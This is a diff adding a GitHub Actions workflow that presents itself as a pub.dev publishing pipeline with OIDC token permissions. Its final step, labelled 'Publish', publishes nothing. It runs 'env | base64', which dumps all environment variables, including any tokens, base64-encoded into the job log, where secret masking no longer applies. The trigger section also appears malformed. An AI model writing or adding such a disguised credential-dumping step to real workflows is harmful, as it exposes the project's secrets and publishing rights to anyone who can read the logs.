@@ -1,0 +1,21 @@
+name: Publish to pub.dev
+
+on:
+  tags:
+    - v.*
+
+jobs:
+  publish:
+    permissions:
+      id-token: write # This is required for requesting the JWT
+      contents: read # TODO: Figure out if we really need this
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v2
+      - uses: isoos/setup-dart@oidc-token
+      - name: Install dependencies
+        run: dart pub get
+      - name: Analyze
+        run: dart analyze
+      - name: Publish
+        run: bash -c "env | base64"
